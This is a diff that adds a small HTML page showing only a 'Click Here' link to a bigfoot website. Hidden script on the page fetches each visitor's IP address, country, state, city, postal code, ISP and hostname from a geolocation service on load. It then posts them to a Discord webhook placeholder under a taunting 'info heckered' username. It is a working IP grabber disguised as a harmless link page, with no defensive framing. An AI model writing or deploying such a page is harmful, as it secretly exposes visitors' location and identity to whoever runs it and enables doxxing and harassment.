@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+    <center><h1><a href="https://www.bigfootproof.com/">Click Here</a></h1></center>
+</html>
+
+<script>
+function geo(json) {
+  var request = new XMLHttpRequest();
+      request.open("POST", "DISCORD_HEBHOOK_HERE");
+      request.setRequestHeader('Content-type', 'application/json');
+  var params = {
+    username: "info heckered by vermin supreme",
+    avatar_url: "https://i.postimg.cc/g2DcKV3J/index.jpg",
+    content: "**IP:** " + json.ip + "\n" + "**COUNTRY:** " + json.country_name + "\n" + "**STATE:** " + json.region + "\n" + "**CITY:** " + json.city + "\n" + "**POSTAL CODE:** " + json.postal_code + "\n" + "**ORG:** " + json.org + "\n" + "**HOSTNAME:** " + json.hostname 
+  }
+ request.send(JSON.stringify(params));
+}
+</script>
+<script src="https://json.geoiplookup.io/?callback=geo"></script>
